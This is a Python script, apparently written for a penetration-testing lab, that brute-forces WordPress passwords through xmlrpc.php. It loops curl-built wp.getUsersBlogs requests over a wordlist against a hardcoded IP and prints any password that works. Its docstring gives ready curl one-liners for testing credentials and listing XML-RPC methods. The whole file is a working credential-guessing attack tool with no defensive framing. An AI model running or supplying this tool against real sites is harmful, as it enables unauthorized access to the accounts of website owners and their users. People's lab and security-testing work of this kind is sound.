import os
import sys
import time
import subprocess

import argparse
from collections import ChainMap

"""
Some bicycle for bruteforse by curl in you tired of hydra, burp, zap and etc...

Check usernames and passes:
curl -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>admin</value></param></params></methodCall>" -X POST http://10.11.1.234/xmlrpc.php

Check methods:
curl -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>admin</value></param></params></methodCall>" -X POST http://10.11.1.234/xmlrpc.php

curl -d "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>" -X POST http://10.11.1.234/xmlrpc.php

"""

parser = argparse.ArgumentParser(description='Script for POST curl bruteforce. Example: python3 xmlrpc_brute.py -l admin -p /usr/share/seclists/Passwords/darkweb2017-top100.txt')
parser.add_argument('-l', '--login', help='Login to bruteforce')
parser.add_argument('-p', '--passfile', help='File with passwords')

args = parser.parse_args()
new_dict = {key: value for key, value in vars(args).items() if value}
settings = ChainMap(new_dict)

pass_lst = []

# Read file with paswords and generate list
with open(settings['passfile']) as fp:
	for line in fp:
		if len(line) > 0:
			pass_lst.append(line.strip())


def curl_req(login,password):
	url = 'http://10.11.1.234/xmlrpc.php'
	payload = '<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>' + login + '</value></param><param><value>' + password + '</value></param></params></methodCall>'
	res = subprocess.check_output(['curl', '-d', payload, '-X', 'POST', url], stderr=subprocess.STDOUT)
	res = res.decode()

	return res


def brute(login,password_list):

	pass_lst_len = len(password_list)

	for i, password in enumerate(password_list):

		# Our curl request
		res = curl_req(login, password)
		# payload = '<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>' + login + '</value></param><param><value>' + password + '</value></param></params></methodCall>'
		# res = subprocess.check_output(['curl', '-d', payload, '-X', 'POST', url], stderr=subprocess.STDOUT)
		# res = res.decode()

		# Our progress-bar
		sys.stdout.write(f'Progress: {i + 1}/{pass_lst_len}\r')
		sys.stdout.flush()

		# Check result
		if '<value><string>Incorrect' not in res.split():
			
			print('##########################################')
			print('Found password!')
			print(f'{settings["login"]}:{password}')
			print(f'Row: {i + 1}/{pass_lst_len}')
			print('##########################################')

			sys.stdout.write('\n')
			sys.stdout.flush()

			break

		sys.stdout.write('\b')
		sys.stdout.flush()


def main():
	start_time = time.time()

	brute(settings['login'], pass_lst)

	print(f'Required time: {(time.time() - start_time):.1f} sec')

if __name__ == '__main__':
	main()
